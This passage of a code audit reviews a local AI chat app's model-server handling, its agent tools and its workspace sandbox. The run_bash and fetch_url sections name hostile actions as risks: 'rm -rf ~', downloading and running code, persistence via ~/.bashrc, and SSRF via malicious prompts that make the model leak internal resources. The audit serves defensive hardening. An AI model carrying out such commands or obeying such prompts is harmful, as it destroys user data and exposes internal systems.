#### Exit handler (lines 335–340)

```ts
serverProc.on('exit', (code) => {
  console.log('[mlx] server exited with code', code)
  earlyExit = { code, stderr: stderrBuf }
  serverProc = null
  currentModel = null
})
```

Critical for the lying-spinner analysis: **if the subprocess is killed (by anything — explicit SIGTERM, jetsam SIGKILL, OOM, segfault), this handler fires and `earlyExit` becomes non-null.** Node's child-process spawn correctly handles SIGCHLD; this is reliable.

#### `await waitForHealth(600_000, () => earlyExit)` (line 344)

Hands control to the health-poll loop. 10-minute timeout.

### `waitForHealth()` (lines 360–388)

```ts
while (Date.now() - start < timeoutMs) {
  const exit = checkEarlyExit()
  if (exit) throw new Error(`MLX server exited with code ${exit.code}. ${exit.stderr.slice(-500)}`)
  try {
    const res = await fetch(`${MLX_URL}/v1/models`)
    if (res.ok) return
  } catch (e) { lastError = e }
  await new Promise((r) => setTimeout(r, 1500))
}
throw new Error(`MLX server did not become healthy within ${timeoutMs / 1000}s: ${String(lastError)}`)
```

Two ways to exit healthy: `/v1/models` returns 200. Three ways to throw: subprocess exited (per `earlyExit`), 10 minutes elapsed without health, or the timeout-on-no-Python in `startServer`'s precondition (above).

**Iteration cadence:** 1500ms sleep between probes. In 10 minutes, ~400 polls.

### The lying spinner, fully resolved

Combining §2.4 + the above, the failure mode breaks down into two distinct cases:

**Case A — subprocess crash (jetsam, OOM, segfault, explicit kill):**
1. Subprocess dies → Node fires `'exit'` event → `earlyExit` populated.
2. Next iteration of `waitForHealth` (within 1500ms) → throws.
3. `ensureMLXRunning` propagates the throw to `handleSetup` → `setup:status { stage: 'error', error: '...' }`.
4. UI shows the error. **No lying spinner in this case.** This works correctly.

**Case B — HuggingFace download stalls without process death (HF Xet hang):**
1. Subprocess is alive and the Python interpreter is blocked inside HF's downloader on a socket read that never returns.
2. No tqdm output → no `onProgress` calls → UI's last-known progress stays frozen.
3. `/v1/models` returns connection-refused (server hasn't bound the port yet, that happens *after* model download) → `waitForHealth` catches and retries.
4. This continues for the full **10 minutes** until `waitForHealth` finally throws `MLX server did not become healthy within 600s`.
5. UI eventually shows the error… but the user has typically given up and force-quit long before the 10-minute mark.

**This is the real lying spinner.** From the user's perspective, it's "the spinner is stuck at 12% for several minutes with no movement." From the system's perspective, it's "we're patiently waiting up to 10 minutes for a healthy server." Both are technically correct; neither serves the user.

### Fix space for the hardening roadmap

1. **No-progress dead-man timer.** If 60–120 seconds elapse with no `onProgress` call AND `waitForHealth` hasn't returned, surface a warning to the UI ("Download appears stalled — check your network or try again"). This is the most impactful single fix.
2. **Switch HF transport.** Set `HF_HUB_ENABLE_HF_TRANSFER=1` in the spawn env. `hf_transfer` is a Rust-based downloader that doesn't hit the Xet protocol stall. Requires `pip install hf_transfer` as an additional dep.
3. **Renderer-side stale-status timer.** Independent of main. If `setup:status` hasn't updated in N seconds while in `downloading-model`, show a "this is taking longer than expected — see logs?" banner.
4. **Shorter overall timeout.** 10 minutes is too long for a "first-run download" given that the failure has a 10-minute tail. 3-4 minutes with the dead-man timer above is plenty.

### `stopServer()` (lines 347–354)

```ts
export function stopServer(): void {
  if (serverProc && !serverProc.killed) {
    serverProc.kill('SIGTERM')
    serverProc = null
    currentModel = null
  }
}
```

**Synchronous, fire-and-forget.** Sends SIGTERM, doesn't wait for the child to actually exit before nulling state. The `'exit'` handler will eventually run and set `earlyExit`, but by then `serverProc` is already null.

This is *almost always fine* but interacts poorly with `before-quit` in `index.ts`: that handler calls `stopServer()` and `stopWorkspaceServer()` synchronously, then Electron quits. The child gets SIGTERM but may have unfinished work (writing HF cache, flushing stderr, etc.) when the parent dies. Captured for §Hardening — a proper shutdown would await the child's exit with a SIGKILL fallback after N seconds.

## 3.7 Model management

### `listLocalModels()` (lines 394–403)

Hits `/v1/models` and returns the IDs. **Misleading name:** this lists models *currently loaded by the server*, not models cached on disk. If the server isn't running, returns `[]`. If only Gemma-E4B is loaded, returns just that. Captured for §Hardening — either rename the function or actually scan `<modelsDir>/hub/models--*` for real local availability.

### `hasModel(_name)` (lines 405–412)

**Dead-ish:** the `name` parameter is prefixed with `_` to signal "unused." The function returns `true` if the server has *any* models loaded, not whether the specific named model is local. Unused by `index.ts` (the import was flagged in §2.1 as dead). Captured for §Hardening — remove or fix.

## 3.8 Chat streaming — `chatStream()` (lines 431–482)

The actual inference call. Uses the OpenAI-compatible `/v1/chat/completions` endpoint that `mlx_vlm.server` exposes.

### Request body (lines 437–446)

```ts
{
  model: opts.model,
  messages: opts.messages.map((m) => ({ role: m.role, content: m.content })),
  stream: true,
  temperature: opts.temperature ?? 0.7,
  max_tokens: 8192
}
```

**CRITICAL BUG — multimodal images are dropped at the bridge:**

```ts
interface MLXChatMessage {
  role: 'user' | 'assistant' | 'system' | 'tool'
  content: string
  images?: string[]                                  // ← declared
}
// ...later...
messages: opts.messages.map((m) => ({
  role: m.role,
  content: m.content                                  // ← `images` is NOT mapped through
})),
```

`MLXChatMessage` advertises an `images?: string[]` field, but `chatStream`'s body construction strips it before it ever reaches `mlx_vlm.server`. **Even if the renderer constructed image-bearing messages, they would never reach the model.** Gemma 4's multimodal capability — the entire motivation for Patch 4 — is currently inaccessible through this code path.

**This is a real, capability-defeating bug.** Captured at the top of §Hardening Roadmap. The fix needs to also confirm the wire format `mlx_vlm.server` expects — likely OpenAI's `[{ type: 'text', text: ... }, { type: 'image_url', image_url: { url: 'data:image/...' } }]` content-array shape, not the flat `images: string[]` we currently model.

### Other parameters

- **`temperature: 0.7`** — default. **Not exposed in `ChatRequest`** (in `shared/types.ts`); the renderer cannot configure this per-message or per-conversation. Captured for §Hardening — temperature/top-p controls are standard UX for chat apps.
- **`max_tokens: 8192`** — hard-coded ceiling. 8K tokens is enough for most chat turns but constrains long code generation (Build tab) where a single file might already exceed that. Captured for §Hardening.

### Response handling (lines 450–481)

- If `!res.ok || !res.body`, throws with status text + first body snippet.
- Otherwise iterates `readSSE(res.body)`:
  - `[DONE]` sentinel → yield `{ done: true }`, return.
  - Otherwise JSON-parse the event. Extract `choices[0].delta.content` → yield `{ content: deltaText }`. Extract `choices[0].finish_reason === 'stop' | 'length'` → yield `{ done: true }`, return.
  - Malformed JSON → silently skipped (line 477 catches). Reasonable defensive choice.
- After the stream ends naturally → yield `{ done: true }` (line 481). Defensive — handles the case where the server closes the connection without an explicit `[DONE]`.

### `readSSE()` (lines 485–518)

Standard SSE parser:
- `getReader()` on the body, decode UTF-8 with `{ stream: true }` (correct — handles multi-byte char split across chunks).
- Buffer up to a `\n\n` delimiter (SSE event boundary), parse each `data: ...` line within.
- Final flush of leftover buffer at end (lines 510–517).

No issues spotted. This is a clean implementation.

## §3 Synthesis

1. **Lying spinner is HF download stall, not subprocess death.** Crash detection works. Stall detection doesn't exist. Single biggest hardening win: a no-progress dead-man timer plus `HF_HUB_ENABLE_HF_TRANSFER=1`.

2. **Multimodal is silently broken at this layer.** The whole point of Patch 4 — Gemma 4's vision capability — is currently unreachable because `MLXChatMessage.images` is dropped before the HTTP request. This needs to lead the hardening roadmap.

3. **Patch 4 was 90% complete.** Three doc-comment occurrences of "mlx-lm" survive in this file. Trivial cleanup.

4. **Defensive pip configuration is well-designed.** The double-protection of CLI `--index-url` + env `PIP_INDEX_URL` + `PIP_EXTRA_INDEX_URL: ''` is the right call for a tool that runs against arbitrary corporate machines.

5. **All MLX state is under userData.** Clean separation; uninstalling means deleting one app-data folder. Nothing else on the system is affected. This is good architecture and worth preserving.

6. **No structured logging.** Everything goes through `console.log`, which means everything is in the terminal where `npm run dev` ran, or buried in macOS Console for the packaged app. A structured logger written to a known file (`<userData>/mlx/logs/`) would make post-mortems of failures dramatically easier. Captured for §Hardening.

7. **No tests.** Same `package.json`-level observation as §1, but this file is where it bites hardest. Even a single integration test that spins up `mlx_vlm.server` against a tiny test model would have caught the `images` drop and the stale `mlx-lm` doc strings.

Section 3 complete. Section 4 (`src/main/tools.ts` — 593 lines, never previously inventoried) is next.

---

# Section 4 — Main Process: `src/main/tools.ts`

**Path:** `src/main/tools.ts` (593 lines)

**Role:** The complete tool/function-calling layer. Defines the `ToolSpec` contract, registers 10 concrete tools, writes the two system prompts (chat and code mode) that teach Gemma the XML-tag action format, and provides the streaming-safe parser that the chat orchestrator uses to extract action blocks from the model's token stream.

**This is the foundation for your stated goal of "use Skills as well as access my filesystem on an approved basis."** Any future Skills integration — whether MCP-style, hardcoded, or hot-loaded — will register additional entries against the `TOOLS` registry defined here. Any "approved filesystem access" feature will extend the workspace-rooted tools or add new ones with explicit user-approval gates.

The agent's entire visible capability surface lives in this file.

## 4.1 Imports & contract types

### Imports (lines 1–10)

Only one source: `./workspace`. Pulls `wsWriteFile, wsReadFile, wsEditFile, wsDeleteFile, wsRunBash, ensureWorkspace, listTree, previewUrl`. The clean separation means "what can the agent *do* in the filesystem" is asked at workspace.ts boundaries (§5), while "what tools exist and how are they parsed" lives here.

### `ToolContext` (lines 12–15)

```ts
interface ToolContext {
  conversationId: string
  onFileChange?: () => void
}
```

Passed to every tool run. The `onFileChange` callback is what notifies the Canvas tab to re-list (wired in `index.ts:handleChat` as `() => send('workspace:changed', ...)`). Every tool that mutates the workspace calls `ctx.onFileChange?.()`.

### `ToolSpec` (lines 17–24)

```ts
interface ToolSpec {
  name: string
  description: string
  params: Array<{ name; description; required?; multiline? }>
  example: string
  mode: 'chat' | 'code' | 'both'
  run: (args, ctx) => Promise<string>
}
```

The contract every tool must satisfy. Three things to note:
- **`mode` partitions the tool catalog.** Code-mode-only tools (file CRUD, bash, preview) are invisible in chat mode. The system prompt renders only matching-mode tools (see `renderToolHelp` below).
- **`params` is self-describing.** The system prompt builds parameter docs from this list — so adding a new param to a tool automatically updates what Gemma is told.
- **`run` returns a `string`.** The result is always a string that gets fed back to the model as a synthetic `tool`-role message. Errors are stringified ("Error: ..."), not thrown — the orchestrator never sees a rejection from a tool unless something deeper is broken. This is intentional: the model learns from textual error messages.

## 4.2 The ten tools — what each one actually does

### 4.2.1 `web_search` (lines 29–82) — DuckDuckGo HTML scrape

`mode: 'both'`. Single param: `query`.

1. Trim query, error if empty.
2. GET `https://duckduckgo.com/html/?q=${encoded}` with a hardcoded **Chrome 122 macOS User-Agent** (line 27).
3. Regex-parse the HTML for `.result` blocks: title, URL, snippet.
4. URL cleanup: DDG wraps real URLs in `//duckduckgo.com/l/?uddg=<encoded>` redirects. We `decodeURIComponent`, strip `&rut=`, `&amp;`, and any `&` query parameters.
5. Return top **6** results (line 36; line 66 has a soft cap of 10 but is unreachable given the 6-slice).
6. Format: `[N] title\nURL\nsnippet` separated by blank lines.

**Fragility:** Entire approach is **HTML regex against DuckDuckGo's markup**. Any change to DDG's class names or block structure silently breaks search. `parseDuckDuckGoResults` returns `[]` gracefully → tool returns `"No results found."` → model thinks the query had no hits. Captured for §Hardening — either swap to DDG's instant-answer API, a different scraper-friendly engine, or a real search API (Brave, Tavily, Serper).

**Privacy posture:** No telemetry, no API key, no logging of queries beyond the console.log in `runProcess`. Search-and-forget. Good default.

### 4.2.2 `fetch_url` (lines 84–116) — Generic HTTP GET

`mode: 'both'`. Single param: `url`.

1. Validate: must be `http://` or `https://`. Anything else returns `"Error: url must be http(s)"`.
2. GET with the same Chrome UA.
3. If `content-type` includes `html`: pass through `htmlToText` (strips `<script>`, `<style>`, `<noscript>`, all tags, decodes entities). Otherwise return raw text.
4. **Truncate to 8000 chars** (line 94 + 96). Beyond that, silently dropped.

**Security holes worth flagging:**
- **No URL allowlist / denylist.** The model can fetch any URL — including `http://localhost:11437`, internal `192.168.x.x` IPs, AWS metadata endpoints, etc. **Classic SSRF (Server-Side Request Forgery) surface.** A malicious-looking user message could induce the model to fetch internal resources and leak them back into chat. Captured as high-priority §Hardening.
- **No size cap before the 8KB truncation.** A multi-gigabyte response would be fully buffered into memory before the slice. `fetch` has no built-in stream-cap. A bad actor (or accidentally-pointed-at-a-firehose model) could OOM the main process.
- **No timeout.** A slow-loris response hangs the tool call forever. The chat orchestrator has no per-tool timeout either. Worst case: a chat turn hangs until the user manually aborts.

### 4.2.3 `calc` (lines 118–131) — Numeric expression evaluator

`mode: 'both'`. Single param: `expression`.

1. Whitelist regex: `/^[0-9+\-*/().\s^%,eE]*$/`. Anything outside that set returns `"Error: only numeric expressions allowed"`. The whitelist allows scientific notation (e/E) and ^/% for exponent/modulo expressions.
2. Substitute `^` → `**` (JS exponent).
3. **Evaluate via `Function("use strict; return (expr)")()`** — i.e., the `Function` constructor.

**Verdict:** The whitelist is genuinely tight (no letters except `eE`, no `;`, no `[`, no string literals), so `Function` cannot reach arbitrary JS via this code path. But the *pattern* of using `Function` is risky on principle. Captured for §Hardening — replace with a real expression parser (`mathjs` or a tiny custom shunting-yard) so the pattern doesn't survive into future modifications that might widen the whitelist.

### 4.2.4 `write_file` (lines 133–142) — Create or overwrite

`mode: 'code'`. Params: `path`, `content` (multiline).

1. Run `cleanFileContent(raw, path)` before writing. (See §4.3 for what this does.)
2. `wsWriteFile(ctx.conversationId, path, content)`.
3. `ctx.onFileChange?.()`.
4. Return `"Wrote <path> (<bytes> bytes, <lines> lines)."`.

Note: the live-write streaming in `handleChat` (§2.5) calls `wsWriteFile` *and* `cleanFileContent` directly from the orchestrator while the model is still emitting `<content>`. By the time the tool's `run` fires (with the closed `</content>`), the file has typically already been written multiple times in flight. The `run` call effectively writes the final version + emits the textual confirmation.

### 4.2.5 `read_file` (lines 180–192) — Read with truncation

`mode: 'code'`. Single param: `path`. Reads via `wsReadFile`. **Truncates to 20,000 chars** (line 185–187), appending `\n[…truncated]`. Wraps in try/catch; errors stringified.

### 4.2.6 `edit_file` (lines 194–208) — In-place string replace

`mode: 'code'`. Params: `path`, `old_string` (multiline), `new_string` (multiline), `replace_all` (boolean, optional).

Delegates to `wsEditFile`. Coerces `replace_all` from either boolean `true` or the literal string `'true'` (depending on whether the action parser stringified it). Returns `"Edited <path> (<N> replacements)."` on success.

The contract enforced by `wsEditFile` (verified in §5) is: `old_string` must match exactly once, unless `replace_all=true`. Multiple matches without `replace_all` throws — this is the discipline that prevents the model from accidentally editing the wrong occurrence.

### 4.2.7 `list_files` (lines 210–222) — Workspace tree dump

`mode: 'code'`. No params. Calls `listTree(workspaceBase, 200)`. **Cap of 200 entries** (lower than `workspace:list` IPC's 300, see §5).

Format: directories with trailing `/`, files with `(NB)` size annotation. One entry per line.

### 4.2.8 `delete_file` (lines 224–234) — Remove file or directory

`mode: 'code'`. Single param: `path`. Calls `wsDeleteFile`, fires `onFileChange`, returns `"Deleted <path>."`.

**No confirmation prompt.** The model can wipe the workspace by calling this repeatedly. The blast radius is bounded to the per-conversation workspace dir (§5 will verify), so even worst-case the user loses one conversation's generated files. Still: captured for §Hardening — a soft confirmation step (require the model to repeat the path or pass a `confirm=true` arg) would prevent accidental destruction.

### 4.2.9 `run_bash` (lines 236–252) — **Arbitrary shell execution**

`mode: 'code'`. Params: `command` (multiline), `timeout_ms` (number, default 60_000).

Delegates to `wsRunBash`. Returns `exit=<code> (<duration>ms)\nstdout:\n...\nstderr:\n...\n[output was truncated]`.

**This is the most powerful and most dangerous tool in the registry.** The model can run any shell command. Specific risks:

- The command runs inside the workspace dir (verify in §5), but `cd /tmp` or absolute-path commands escape that easily.
- Network egress: `curl`, `wget`, `npm install`, `pip install`, `git clone` — all available. The model can pull arbitrary code from the internet and execute it.
- Filesystem reach: `rm -rf ~` would not be sandboxed by the cwd-in-workspace setup unless `wsRunBash` constrains it (verify §5).
- Persistence: write to `~/.bashrc`, install launchd plist, etc.

**As we add Skills + filesystem access, the threat model widens substantially.** The current implicit trust ("the model is Gemma, running locally, and the user explicitly clicked Build") is reasonable for a single-user dev tool but becomes unsafe if/when:
- The conversation becomes user-shared (someone pastes a malicious prompt)
- Skills introduce model-controlled extension loading
- Filesystem access widens to user's real working dirs

Captured at the top of §Hardening Roadmap alongside the multimodal-images bug. The right pattern is probably: per-tool approval (user clicks "Approve" before `run_bash` fires), with optional "Always approve in this conversation" toggles.

### 4.2.10 `open_preview` (lines 254–257) — Reveal Canvas

`mode: 'code'`. No params. Returns a string telling the model the preview URL. Pure informational — does not actually focus the Canvas pane (the rendering is handled by `Canvas.tsx` reacting to `workspace:changed` events). The tool exists primarily so the model can deliberately mark "I'm done, look here" — used as the terminal action in code mode per the system prompt.

## 4.3 `cleanFileContent(raw, path)` (lines 144–178) — Markdown-fence stripper

This is the workhorse that protects against Gemma's strong habit of wrapping file contents in code fences even when explicitly told not to. Three cases:

### Case 1 — Fully wrapped (lines 148–150)

Regex: `/^```[a-zA-Z0-9_-]*\n([\s\S]*?)\n```[\s\S]*$/`

Matches `\`\`\`html\n<file content>\n\`\`\`<anything after>`. Captures group 1 = the inner content. **The `[\s\S]*$` tail is intentional** — strips trailing commentary the model may have added after the closing fence ("Key features: ...").

Edge case: requires a leading `\n` after `\`\`\`lang` — would miss `\`\`\`html\r\n<content>` (Windows-style line endings emitted by the model). Low likelihood in practice but captured for §Hardening.

### Case 2 — Leading fence only (lines 153–159)

If the full-wrap regex didn't match but the content starts with `\`\`\`lang\n`, strip the leading fence. Then look forward for any `\n\`\`\`(?:\s|$)` and truncate everything from there.

### Case 3 — File-type-aware trailing truncation (lines 163–175)

- `.html`/`.htm` files: find the last `</html>`, truncate after it (+ `\n`).
- `.svg` files: same with `</svg>`.
- `.json` files: trim, find the last `}` or `]`, truncate there.

This catches the failure mode where the model writes valid HTML/SVG/JSON followed by explanatory prose. Robust for those three file types; silently ignored for others (`.css`, `.js`, `.md`, `.py` — model would have to behave for these).

**Worth knowing:** `cleanFileContent` is `export`ed and used by *two* call sites — the `write_file` tool itself, and the live-write streaming path in `handleChat` (§2.5). The two paths must use identical cleaning logic so the in-flight partial-disk-writes and the final post-action write are byte-identical. This is correctly enforced by sharing the function.

## 4.4 The system prompts

Two functions, both called from `handleChat` (§2.5).

### `chatSystemPrompt(enableTools: boolean)` (lines 391–424)

Two variants. **Both inject `new Date().toISOString()`, day-of-week, and the IANA timezone** (lines 392–393, `tz()` defined at line 359). This is the model's temporal grounding — without it, Gemma would have no idea what date it is.

- **No tools variant:** ~3 lines. "You are Gemma, AI assistant, local Mac. Be clear, concise, helpful."
- **With tools variant:** ~25 lines. Adds the `<action name="...">` format, the rule "one action per response, then STOP and wait," and the rendered tool catalog from `renderToolHelp('chat')`.

### `codeSystemPrompt(workspacePath, previewHref)` (lines 426–498)

~70 lines of carefully-tuned prompt engineering. Much more opinionated than chat mode:

1. **Identity & context:** "You are Gemma, a local coding agent." Date/day/workspace/preview-href injected.
2. **What to build:** "small apps, pages, demos, and scripts. Quality matters — the user is watching." With detailed style direction: modern polished design, real-feeling copy not lorem ipsum, working interactivity, CSS/SVG over fetched images.
3. **File structure heuristic:** single `index.html` with inline `<style>` + `<script>` for one-off widgets; split into `index.html` + `style.css` + `app.js` for anything substantive.
4. **The action loop:** plan in ONE sentence, IMMEDIATELY emit the first `write_file` in the SAME response (this is the rule the round-0 nudge in `handleChat` enforces), then narrate-then-action one at a time, call `open_preview` at the end.
5. **`<content>` rules — "read twice":** literal disk write, NO fences inside `<content>`, NO commentary inside `<content>`, close tags on their own line. This is the bulk of the prompt — fighting Gemma's natural tendency to over-format.
6. **Example multi-file build** (lines 467–485). A worked example showing exactly the expected output format with `<!doctype html>` content.
7. **Hard rules** restated.
8. **Available tools:** rendered from `renderToolHelp('code')`.

**Engineering quality observation:** the code prompt is the result of many iterations of fighting model failure modes. Each "NEVER" line corresponds to a specific historical bug. Worth treating as accumulated wisdom — don't rewrite from scratch without preserving the lessons. Captured for §Hardening: when we extend with Skills, the prompt needs additive composition, not replacement.

### `renderToolHelp(mode)` (lines 367–389)

Iterates `TOOLS`, filters by `mode === 'both' || mode === currentMode`, renders each as a markdown-ish block:

```
### tool_name
description
Parameters:
  <param>: description (required) — multi-line OK
Example:
<action name="tool_name">...
```

The result is interpolated into the system prompt. **This means adding a new tool automatically appears in the prompt** — no manual prompt-string edit required. Good extensibility property.

## 4.5 The streaming action parser

Three functions, used by the orchestrator's tool-parsing loop in `handleChat`.

### `findNextAction(text, from=0)` (lines 508–528)

Returns one of:
- `ParsedAction` (full action found, parsed),
- `'incomplete'` (open tag found but no matching close — model is mid-emit),
- `null` (no open tag at or after `from`).

Open-tag regex tolerates variations: `<action name="x">`, `<action name='x'>`, `<action name=x>`, with optional whitespace, case-insensitive. The captured group is the tool name (`[a-zA-Z_][\w]*`).

Once an open tag is found, looks for `</action>` after. Closing is also case-insensitive with optional whitespace. If found, slice the body and pass to `parseActionBody`.

### `parseActionBody(body)` (lines 530–560)

Two-phase parse:

1. **`<content>...</content>` special-case** (lines 534–545). Uses `lastIndexOf('</content>')` so nested `</content>` (which can appear inside HTML the model is writing, e.g., a `<style>` block with text saying `</content>`) doesn't prematurely close the body. Trims leading `\n` and trailing whitespace from the content. Removes the `<content>...</content>` span from the body before phase 2.
2. **All other `<key>value</key>` tags** (lines 547–558). Simple regex sweep. For each match:
   - Skip if `key === 'content'` (already handled, shouldn't reach here but defensive).
   - Type coercion: `'true'` → boolean true, `'false'` → boolean false, digit-only-with-optional-sign → number, anything else → trimmed string.

**Result:** a flat `Record<string, unknown>` matching the tool's `params` declaration. Type-coercion is a small but meaningful UX detail — `<replace_all>true</replace_all>` becomes boolean `true`, not string `"true"`, so the tool's `args.replace_all === true` check works as expected.

**Edge case worth flagging:** attribute-style params (`<action name="x" path="foo">`) are not supported. All params must be nested tags. Reasonable design choice (one syntax, less for the model to confuse) — and the system prompt is unambiguous about it.

### `emitSafeBoundary(buffer, from)` (lines 562–579)

The cleverest function in the file. Solves: during streaming, we want to flush emitted-but-not-yet-shown buffer content to the renderer as plain text — but we must NOT emit characters that are forming the start of an `<action` tag we haven't fully received yet.

Algorithm:
1. Scan backward from `buffer.length - 1` to `from` looking for `<`.
2. For each `<` found, look at the substring from there to end.
3. If that substring could be the start of `<action` (case-insensitive), hold the boundary there — don't emit past this `<`.
4. Otherwise this `<` is some other tag (`<p>`, `<div>`, etc.) — keep scanning further back.
5. If no ambiguous `<` is found, the whole buffer is safe.

**Tradeoff:** Slightly conservative. A pending `<table>` would NOT be held back because `<table` doesn't start with `<action`. Only `<a` followed by characters that match the prefix of "action" hold the boundary. This is exactly the right granularity.

**Without this function**, the streaming would either (a) emit the literal characters `<action name="write_file">` as plain text to the user (ugly) or (b) buffer everything until end-of-stream (no streaming benefit). The boundary emitter gives us live token streaming AND clean action-tag elision.

## 4.6 `runTool(name, args, ctx)` (lines 581–593)

The dispatcher. Looks up `TOOLS[name]`:
- Unknown → `"Error: unknown tool \"X\". Available: ..."` (includes the catalog so the model can self-correct).
- Known → `await tool.run(args, ctx)`, catch any rejection → `"Error running <name>: <message>"`.

**Every tool error is a string return, never a thrown rejection.** This is the single discipline that lets the chat orchestrator treat tool execution as infallible from a control-flow perspective. Errors propagate to the model as `[error] tool_name: message` synthetic tool messages, and the model is expected to read and adapt.

## §4 Synthesis — what tools.ts tells us about extensibility

1. **The architecture is genuinely good for adding Skills.** `TOOLS` is a flat string-keyed registry. Each `ToolSpec` is fully self-describing (name, params, mode, example, run). Adding a new tool means appending one entry; the system prompt updates automatically via `renderToolHelp`. This is the right starting point for a Skills integration — Skills become dynamically-discovered `ToolSpec` entries that get merged into the registry at startup or on-demand.

2. **The XML-tag action format is the wire protocol.** Skills would need to either (a) emit the same `<action name="...">` shape, which means every Skill is conceptually a tool with structured params, or (b) introduce a parallel routing mechanism. Path (a) is the simpler integration and keeps one parsing path. Worth discussing the tradeoff explicitly when we get to designing the Skills extension.

3. **`run_bash` is the high-water-mark of capability and the high-water-mark of risk.** Any approved-filesystem-access feature should *not* widen `run_bash`'s scope — it should add new narrower tools (`fs_read_user_dir`, `fs_write_with_approval`, etc.) with explicit user approval gates. The architecture supports this cleanly (just add new `ToolSpec` entries with new `run` implementations that prompt the user before proceeding).

4. **Per-tool approval doesn't exist yet.** This is the single biggest functional gap for the "approved basis" goal. A new layer in `runTool` could intercept high-risk tools, surface an approval dialog via a new IPC channel, await the user's decision, then proceed or reject. Captured as the central §Hardening item for that goal.

5. **The system prompts are valuable IP.** Especially `codeSystemPrompt`. Many `NEVER` and `ALWAYS` lines map to specific historical failure modes the upstream and we have battled. Treat them as load-bearing; extend, don't rewrite.

6. **Five hardening items specific to tools.ts:**
   - `web_search` HTML-regex fragility (switch to real search API).
   - `fetch_url` SSRF surface (allowlist/denylist + private-IP block + size cap + timeout).
   - `calc` `Function()` pattern (replace with a real parser).
   - `delete_file` confirmation (require explicit `confirm=true` arg).
   - `run_bash` user approval (the central gap for the "approved basis" feature).

Section 4 complete. Section 5 (`src/main/workspace.ts`) is next.

---

# Section 5 — Main Process: `src/main/workspace.ts`

**Path:** `src/main/workspace.ts` (398 lines)

**Role:** Owns the per-conversation working-directory layer and the local HTTP server that exposes those directories to the Canvas preview pane. Provides the path-bounded primitives (`wsWriteFile`, `wsReadFile`, `wsEditFile`, `wsDeleteFile`, `wsRunBash`) that `tools.ts` (§4) wraps as agent-callable tools. Every filesystem operation the agent can perform passes through this file.

**The single most important function in the codebase from a security standpoint is `assertInWorkspace`.** It is the only thing keeping the agent's filesystem reach bounded to its workspace.

## 5.1 Module-level state & path helpers

### State (lines 8–9)

```ts
let server: Server | null = null
let serverPort = 0
```

Singletons for the workspace HTTP server. One server per app run, serves all conversations.

### Paths (lines 11–21)

- **`workspacesRoot()`** → `<userData>/workspaces/`. On macOS: `~/Library/Application Support/Gemma Chat/workspaces/`.
- **`workspaceDir(conversationId)`** → `<userData>/workspaces/<sanitized-id>/`.
- **`sanitizeId`** replaces every char that isn't `[a-zA-Z0-9_-]` with `_`, caps at 80 chars, defaults to `'default'` if the result is empty. Prevents conversation IDs from punching out of the workspaces root through filename-level injection.

### `ensureWorkspace(conversationId)` (lines 23–27)

`mkdir -p` the workspace dir. Idempotent. Returns the absolute path. Called by every tool that reads or writes.

## 5.2 `assertInWorkspace(base, target)` — the security boundary (lines 29–36)

```ts
export function assertInWorkspace(base: string, target: string): string {
  const resolved = resolve(base, target)
  const rel = relative(base, resolved)
  if (rel.startsWith('..') || rel.startsWith('/') || rel.includes('..' + sep)) {
    throw new Error(`Path escapes workspace: ${target}`)
  }
  return resolved
}
```

The classic Node.js path-traversal defense. Three checks on the resolved path's relative form:
1. Starts with `..` (climbs above base).
2. Starts with `/` (absolute path on POSIX — `resolve` keeps absolutes absolute).
3. Contains `../` somewhere (smuggled traversal).

If any check fails, throws. Otherwise returns the resolved absolute path.

**This is the load-bearing security primitive.** Every workspace-mutating function (`wsWriteFile`, `wsReadFile`, `wsEditFile`, `wsDeleteFile`) calls `assertInWorkspace(base, path)` before doing anything. If this check has a bypass, the agent can read/write/delete anywhere on disk that the Electron process has permission for. As of this audit, the check is correctly implemented — but it's worth keeping in mind as **the** function to never break.

**Notable gap:** `wsRunBash` does *not* go through `assertInWorkspace` for its commands — it can't, since commands are arbitrary shell. It only constrains the *cwd*. See §5.7.

## 5.3 The workspace HTTP server (lines 38–168)

### MIME map (lines 38–62)

Comprehensive: HTML, CSS, JS/TS/JSX/TSX (all served as `text/javascript`), JSON, SVG/PNG/JPG/GIF/WebP/ICO, plain text, markdown, PDF, WASM, fonts (WOFF/WOFF2). Default: `application/octet-stream`. Note that `.ts` and `.tsx` are served as JavaScript MIME — useful for previewing TypeScript files in the browser at the cost of no actual type-checking happening server-side (the browser will likely error on TS syntax).

### `startWorkspaceServer()` (lines 64–160)

Called once from `app.whenReady` in `index.ts:476`. If already started, returns the existing port.

1. **`mkdir(workspacesRoot(), { recursive: true })`** — ensure parent dir exists.
2. **Create HTTP server** with a single request handler (see below).
3. **Listen on port 0** (`server!.listen(0, '127.0.0.1', ...)`) — port 0 means "let the OS pick a free port." Bound to localhost only.
4. **Capture the assigned port** from `server.address().port` and store as `serverPort`.

The renderer queries this port via the `workspace:server-port` IPC handler (§2.7).

### The request handler (lines 68–149)

For each incoming request:

1. **CORS headers** (lines 70–73): `Access-Control-Allow-Origin: ${origin ?? '*'}`, methods `GET, OPTIONS`, header `content-type`. **Wide-open CORS** — any origin can XHR these files. **Mitigating factor:** server bound to 127.0.0.1, so reachable only from processes on the same machine (and on a random port). Still: a browser pointed at `http://127.0.0.1:<port>/<conversationId>/` from outside Electron could read any workspace file. Captured for §Hardening — restrict origin to the renderer's origin only (Electron's `file://` for production builds, the Vite dev URL for dev).
2. **Cache-control: no-store** — Canvas previews must always reflect the latest file state.
3. **OPTIONS preflight** → 204 (lines 77–81).
4. **Path parsing** (lines 83–92):
   - URL → `URL` object → split on `/`, filter empties.
   - First segment = conversation ID.
   - Remaining segments = relative path within that conversation's workspace.
   - Empty path → return literal `"gemma-chat workspace server"` text.
5. **Path-traversal guard** (lines 94–100) — calls `assertInWorkspace`. On failure: 400 Bad Path. **Good — defense in depth.** Even though the conversation ID is sanitized, the rest of the path could contain `..` segments; `assertInWorkspace` catches it.
6. **Stat the target** (lines 102–115):
   - On failure (file doesn't exist): if path is the workspace root, render the **placeholder HTML** ("No preview yet — Ask Gemma to create index.html"). Otherwise: 404 Not found.
7. **If it's a directory** (lines 117–136):
   - Look for `index.html`. If present, serve it (with HTML MIME).
   - Otherwise render a directory listing (HTML, links to entries).
8. **If it's a file** (lines 138–144):
   - Pick MIME by extension (default octet-stream).
   - `createReadStream(target).pipe(res)` — streamed response with content-length header.
9. **Any thrown exception** → 500 with the message.

### `stopWorkspaceServer()` (lines 162–168)

`server.close()`, null the references. Called from `index.ts:before-quit`. **Synchronous from the caller's POV** — `server.close()` is non-blocking; in-flight requests may continue briefly. Reasonable for shutdown.

### `previewUrl(conversationId)` (lines 174–176)

```ts
return `http://127.0.0.1:${serverPort}/${sanitizeId(conversationId)}/`
```

